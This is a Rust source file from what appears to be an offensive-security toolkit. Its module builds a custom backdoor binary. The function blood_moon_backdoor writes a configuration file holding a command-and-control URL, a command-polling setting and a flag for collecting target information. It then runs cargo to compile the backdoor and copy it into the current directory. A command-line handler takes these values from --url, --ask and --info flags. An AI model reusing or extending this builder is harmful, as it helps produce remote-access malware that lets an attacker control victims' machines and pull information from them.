use crate::core::messages::standard_messages;
use crate::core::structs::ProcessInit;
use crate::core::utils::*;
use crate::modules::blood_moon::blood_moon_structs::*;
use std::fs::File;
use std::io::prelude::*;
use crate::read_meow;


// pub fn blood_moon(data: SampleData, debug: bool) -> bool {
//     let instance = ProcessInit {
//         source: data.some,
//         source_from: "blood_moon_module",
//         source_description: "Set blood_moon rules",
//         debug: debug,
//     };

//     system_command_exec(instance)
// }

pub fn blood_moon_backdoor(config: BloodMoonBackdoorConfig, debug: bool) -> bool {
    
    let final_setup_file = format!("
        pub const URL: &str =  \"{}\";
        pub const ASK_COMMAND: i32 = {};
        pub const GET_TARGET_INFO: bool = {};",
    config.url,
    config.ask_command,
    config.get_target_info,
);

    let report_config = read_meow("/var/witch_craft/witch_spells/embedded/config.meow", false);
    let path = format!(
        "{}{}",
        report_config["PRIVATE_MODULES"], "blood_moon/blood_moon_backdoor/backdoor/src/core/setup.rs"
    );

    match File::create(&path) {
        Ok(mut file) => {
            file.write_all(final_setup_file.as_bytes());
            println!("Data has been written to the file.");

            let report_config = read_meow("/var/witch_craft/witch_spells/embedded/config.meow", false);
            let path = format!(
                "{}{}",
                report_config["PRIVATE_MODULES"], "blood_moon/blood_moon_backdoor/backdoor/"
            );

            let command = vec![
                format!("cargo build --release --manifest-path {path}Cargo.toml"),
                format!("cp {path}target/release/blood_moon_backdoor ./"),
            ];   

            let mut least_result: bool = false;  

            for cmd in command {
                let instance = ProcessInit {
                    source: &cmd,
                    source_from: "blood_moon_module",
                    source_description: "Setup blood_moon rules and build an custom binary",
                    debug: debug,
                };
            
                least_result = system_command_exec(instance);
            }

            return least_result;

        } 

        Err(_) => {
            println!("Error while written to the file.");
            return false;
        }
    }    

}

pub fn shell_blood_moon(system_input: &mut Vec<String>) -> bool {
    let cmd_arg_name = system_input[2].as_str();

    match cmd_arg_name {
        "--backdoor" => {
            let debug = take_system_args_debug(take_system_args(system_input, "--debug"));
            let blood_moon_data = BloodMoonBackdoorConfig {
                url: &take_system_args(system_input, "--url"),
                ask_command: &take_system_args(system_input, "--ask"),
                get_target_info: &take_system_args(system_input, "--info")
            };

            blood_moon_backdoor(blood_moon_data, debug)
        }

        _ => {
            standard_messages("warning", "Invalid user input", "shell_blood_moon", "cute");
            standard_messages("warning", "Trying exec command", cmd_arg_name, "cute");
            return false;
        }
    }
}
